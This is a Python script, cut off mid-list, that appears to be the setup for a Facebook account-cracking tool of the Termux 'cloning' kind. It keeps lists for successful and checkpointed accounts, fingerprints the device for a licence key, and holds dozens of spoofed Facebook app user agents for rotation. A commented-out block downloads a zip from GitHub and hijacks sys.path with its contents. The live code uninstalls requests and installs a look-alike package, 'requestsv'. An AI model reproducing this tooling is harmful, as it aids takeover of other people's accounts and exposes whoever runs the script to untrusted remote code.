import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp
#_________[ INSTALLING REQUESTS ]_____
'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)
if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"
elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:
	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")

'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)
from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'


def line():
	print(51*'-')
def p(x):
	print(x)


id = []
ok = []
cp = []
loop = 0
method=[]

SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()

def logo():
	os.system('clear')
	logo = (f'''\033[0;32m
	
      _______  _______  _______  _______ _________
     (  ___  )(  ____ \(       )(  ___  )\__   __/
     | (   ) || (    \/| () () || (   ) |   ) (   
     | (___) || (_____ | || || || (___) |   | |   
     |  ___  |(_____  )| |(_)| ||  ___  |   | |   
     | (   ) |      ) || |   | || (   ) |   | |   
     | )   ( |/\____) || )   ( || )   ( |   | |   
     |/     \|\_______)|/     \||/     \|   )_(   
                                            
 
\33[1;97m---------------------------------------------------
 \33[1;97m OWNER     >>    ASMAT
 \33[1;97m GITHUB    >>    HAVEELI PE AJANA
 \33[1;97m TOOL      >>    UNDER TEST
  \33[1;97mVERSION   >>    0.1
\33[1;97m--------------------------------------------------''')

	p(logo)

def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""



bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string


def iAmMethod3Ua():
	ua = random.choice([
	"[FBAN/FB4A;FBAV/377.0.0.92.114;FBBV/68857935;FBDM/{density=8.6,width=693,height=2253};FBLC/en_GB;FBRV/63944364;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J200F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/23.0.0.9.91;FBBV/53150819;FBDM/{density=7.1,width=962,height=2226};FBLC/en_PK;FBRV/30528399;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A300F;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/310.0.0.15.64;FBBV/75398431;FBDM/{density=6.6,width=1300,height=2998};FBLC/en_GB;FBRV/79443280;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J701MT;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/406.0.0.61.119;FBBV/21283967;FBDM/{density=7.1,width=620,height=1982};FBLC/en_US;FBRV/30299848;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965N;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/397.0.0.29.115;FBBV/27383657;FBDM/{density=1.1,width=968,height=2410};FBLC/en_US;FBRV/65901349;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J250M;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/67.0.0.28.131;FBBV/70210828;FBDM/{density=9.2,width=830,height=2745};FBLC/en_US;FBRV/19889687;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G531H;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/89.0.0.99.36;FBBV/68518788;FBDM/{density=3.5,width=542,height=2591};FBLC/en_PK;FBRV/38245177;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S550TL;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/103.0.0.12.138;FBBV/49738119;FBDM/{density=5.7,width=908,height=1187};FBLC/en_US;FBRV/32954855;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G928C;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/171.0.0.72.45;FBBV/39358882;FBDM/{density=6.7,width=861,height=1015};FBLC/en_US;FBRV/27035761;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G150NL;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/119.0.0.81.182;FBBV/42422350;FBDM/{density=2.2,width=1117,height=1204};FBLC/en_GB;FBRV/77664208;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260G;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/221.0.0.49.145;FBBV/76505966;FBDM/{density=9.3,width=585,height=2530};FBLC/en_PK;FBRV/28596184;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A202K;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/293.0.0.71.197;FBBV/86194839;FBDM/{density=2.7,width=726,height=2049};FBLC/en_US;FBRV/87562509;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S727VL;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/71.0.0.39.124;FBBV/20971213;FBDM/{density=1.4,width=1341,height=2785};FBLC/en_GB;FBRV/51854795;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A716V;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/126.0.0.68.151;FBBV/81831481;FBDM/{density=6.4,width=1208,height=2458};FBLC/en_GB;FBRV/83149911;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G935W8;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/166.0.0.46.88;FBBV/52772217;FBDM/{density=9.2,width=714,height=2593};FBLC/en_GB;FBRV/62237866;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9009;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/184.0.0.19.102;FBBV/59108919;FBDM/{density=4.6,width=872,height=1572};FBLC/en_GB;FBRV/70872465;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N976N;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/346.0.0.99.43;FBBV/23604136;FBDM/{density=2.8,width=1449,height=1623};FBLC/en_US;FBRV/79851819;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S757BL;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/257.0.0.20.97;FBBV/73249155;FBDM/{density=4.3,width=1259,height=1337};FBLC/en_US;FBRV/31339313;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S906U;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/292.0.0.92.141;FBBV/13918217;FBDM/{density=3.8,width=973,height=1057};FBLC/en_PK;FBRV/95244621;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N975F;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/102.0.0.75.86;FBBV/83607366;FBDM/{density=9.8,width=545,height=2747};FBLC/en_PK;FBRV/95908305;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G970U;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/143.0.0.86.50;FBBV/54707967;FBDM/{density=2.5,width=1420,height=2292};FBLC/en_GB;FBRV/87029902;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung T116NU;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/366.0.0.64.57;FBBV/16658318;FBDM/{density=3.3,width=1497,height=1692};FBLC/en_PK;FBRV/26351204;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G390F;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/300.0.0.38.82;FBBV/30942654;FBDM/{density=6.7,width=865,height=2321};FBLC/en_PK;FBRV/63558554;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A136U1;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/120.0.0.55.130;FBBV/32366790;FBDM/{density=6.4,width=731,height=2332};FBLC/en_GB;FBRV/35893139;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A102U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/229.0.0.78.38;FBBV/42175900;FBDM/{density=9.6,width=1384,height=2133};FBLC/en_US;FBRV/22301825;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G955W;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/340.0.0.3.131;FBBV/66023692;FBDM/{density=3.5,width=1189,height=1882};FBLC/en_US;FBRV/35055513;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A750GN;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/114.0.0.18.173;FBBV/47376160;FBDM/{density=5.5,width=1256,height=2539};FBLC/en_US;FBRV/47767184;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A3050;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/164.0.0.32.138;FBBV/49317516;FBDM/{density=9.6,width=503,height=1073};FBLC/en_US;FBRV/96935198;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G532M;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/258.0.0.84.68;FBBV/89466704;FBDM/{density=6.9,width=1168,height=2181};FBLC/en_GB;FBRV/82205317;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/270.0.0.66.157;FBBV/81338341;FBDM/{density=2.9,width=1098,height=1279};FBLC/en_PK;FBRV/97990321;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730G;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/111.0.0.68.3;FBBV/46186626;FBDM/{density=4.2,width=571,height=1667};FBLC/en_US;FBRV/95250431;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3815;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/12.0.0.71.194;FBBV/59191250;FBDM/{density=3.6,width=678,height=2538};FBLC/en_GB;FBRV/13046039;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260G;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/215.0.0.1.172;FBBV/46130917;FBDM/{density=5.5,width=724,height=1537};FBLC/en_PK;FBRV/75527471;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3518;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/80.0.0.17.143;FBBV/62552411;FBDM/{density=7.5,width=965,height=2022};FBLC/en_PK;FBRV/43152203;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A526U1;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/167.0.0.18.45;FBBV/38552243;FBDM/{density=8.4,width=557,height=2962};FBLC/en_PK;FBRV/31878650;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7810;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/305.0.0.93.115;FBBV/12371633;FBDM/{density=2.1,width=1393,height=1076};FBLC/en_PK;FBRV/63180368;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G900F;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/327.0.0.67.136;FBBV/64983257;FBDM/{density=3.7,width=748,height=2253};FBLC/en_PK;FBRV/92830383;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G6200;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/211.0.0.62.19;FBBV/12138012;FBDM/{density=1.4,width=1169,height=1486};FBLC/en_PK;FBRV/93677813;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A325F;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/64.0.0.87.200;FBBV/11257322;FBDM/{density=3.1,width=1500,height=1306};FBLC/en_PK;FBRV/62751321;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E135F;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/374.0.0.58.151;FBBV/37582528;FBDM/{density=8.9,width=971,height=1664};FBLC/en_PK;FBRV/57369311;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A426B;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/292.0.0.93.184;FBBV/32023260;FBDM/{density=1.1,width=500,height=2672};FBLC/en_PK;FBRV/70384575;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A300H;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/53.0.0.6.15;FBBV/12229113;FBDM/{density=9.4,width=1055,height=2888};FBLC/en_US;FBRV/95644205;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N920A;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/112.0.0.85.10;FBBV/53680658;FBDM/{density=9.3,width=826,height=2814};FBLC/en_PK;FBRV/74955763;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A525M;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/361.0.0.37.197;FBBV/54713410;FBDM/{density=1.9,width=759,height=1375};FBLC/en_GB;FBRV/29703482;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M305M;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/32.0.0.51.129;FBBV/23677824;FBDM/{density=5.7,width=547,height=1397};FBLC/en_US;FBRV/53564108;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730F;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/282.0.0.87.121;FBBV/82115771;FBDM/{density=9.8,width=1461,height=1350};FBLC/en_PK;FBRV/71239759;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A207M;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/211.0.0.31.36;FBBV/36946809;FBDM/{density=8.8,width=821,height=1805};FBLC/en_US;FBRV/81667461;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G570Y;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/253.0.0.11.65;FBBV/14951344;FBDM/{density=3.7,width=1284,height=2270};FBLC/en_GB;FBRV/43153085;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J105H;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/162.0.0.73.87;FBBV/28250725;FBDM/{density=2.7,width=1303,height=2925};FBLC/en_GB;FBRV/20772087;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9208;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/247.0.0.56.97;FBBV/27905483;FBDM/{density=4.6,width=1484,height=2466};FBLC/en_GB;FBRV/26543611;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120M;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/243.0.0.98.146;FBBV/91163166;FBDM/{density=2.4,width=769,height=1267};FBLC/en_PK;FBRV/16808514;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700H;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/99.0.0.14.15;FBBV/52366557;FBDM/{density=9.3,width=802,height=2481};FBLC/en_PK;FBRV/51570395;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G388F;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/202.0.0.19.174;FBBV/91616097;FBDM/{density=2.4,width=608,height=1315};FBLC/en_GB;FBRV/85456152;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E625F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/134.0.0.20.36;FBBV/58356958;FBDM/{density=9.1,width=1065,height=2838};FBLC/en_US;FBRV/25208255;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3858;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/362.0.0.59.120;FBBV/94203545;FBDM/{density=3.6,width=638,height=2399};FBLC/en_GB;FBRV/15672675;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G550T1;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/353.0.0.14.178;FBBV/47274121;FBDM/{density=8.3,width=1394,height=2210};FBLC/en_GB;FBRV/73458281;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G885S;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/200.0.0.47.38;FBBV/68436054;FBDM/{density=8.5,width=701,height=1324};FBLC/en_PK;FBRV/79395413;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920V;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/125.0.0.43.191;FBBV/91298882;FBDM/{density=2.2,width=1134,height=1078};FBLC/en_US;FBRV/36776682;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C500X;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/255.0.0.81.19;FBBV/37261465;FBDM/{density=1.6,width=971,height=2926};FBLC/en_US;FBRV/41179413;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G965U1;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.9.43;FBBV/36483271;FBDM/{density=1.9,width=620,height=2869};FBLC/en_US;FBRV/30226215;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J700M;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/160.0.0.18.154;FBBV/63110990;FBDM/{density=9.9,width=1038,height=2731};FBLC/en_US;FBRV/21655533;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G935T;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/134.0.0.86.195;FBBV/82138268;FBDM/{density=9.6,width=921,height=1060};FBLC/en_GB;FBRV/80341702;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A105F;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/294.0.0.74.38;FBBV/18088466;FBDM/{density=4.5,width=941,height=1053};FBLC/en_US;FBRV/57488822;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A013G;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/90.0.0.45.73;FBBV/80872247;FBDM/{density=2.2,width=951,height=1334};FBLC/en_PK;FBRV/82262233;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N976N;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/402.0.0.78.41;FBBV/71770775;FBDM/{density=8.7,width=682,height=1932};FBLC/en_PK;FBRV/58241442;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915FY;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/142.0.0.64.67;FBBV/71822902;FBDM/{density=8.1,width=678,height=1273};FBLC/en_US;FBRV/18455275;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung T255S;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/165.0.0.27.190;FBBV/77192284;FBDM/{density=1.4,width=710,height=2736};FBLC/en_PK;FBRV/81550387;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J530FM;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/120.0.0.86.175;FBBV/52762081;FBDM/{density=1.7,width=523,height=1576};FBLC/en_PK;FBRV/97318157;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G550FY;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/187.0.0.20.153;FBBV/79515587;FBDM/{density=5.2,width=1103,height=1159};FBLC/en_US;FBRV/39914068;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A415F;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/256.0.0.97.4;FBBV/55518567;FBDM/{density=2.2,width=1156,height=2115};FBLC/en_PK;FBRV/88965124;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M317F;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/93.0.0.2.193;FBBV/29271157;FBDM/{density=4.2,width=1135,height=1256};FBLC/en_PK;FBRV/45510791;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2021;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/418.0.0.13.18;FBBV/21764850;FBDM/{density=3.2,width=1073,height=1953};FBLC/en_US;FBRV/90698756;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5520;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/269.0.0.65.180;FBBV/58368674;FBDM/{density=2.7,width=995,height=2367};FBLC/en_GB;FBRV/65705639;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G991U;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/167.0.0.42.60;FBBV/22782027;FBDM/{density=8.8,width=777,height=1709};FBLC/en_PK;FBRV/93110409;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G925A;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/179.0.0.1.186;FBBV/62716031;FBDM/{density=3.1,width=1382,height=1189};FBLC/en_GB;FBRV/81076103;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A035F;FBSV/8.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/351.0.0.89.185;FBBV/67327191;FBDM/{density=7.5,width=1251,height=2436};FBLC/en_US;FBRV/54719217;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737T1;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/167.0.0.74.94;FBBV/14554924;FBDM/{density=8.1,width=1047,height=2377};FBLC/en_PK;FBRV/42618818;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9287;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/55.0.0.94.118;FBBV/84090528;FBDM/{density=4.8,width=514,height=1783};FBLC/en_PK;FBRV/48863219;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605FN;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/175.0.0.12.112;FBBV/51164763;FBDM/{density=1.9,width=1335,height=1374};FBLC/en_PK;FBRV/33845107;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3815;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
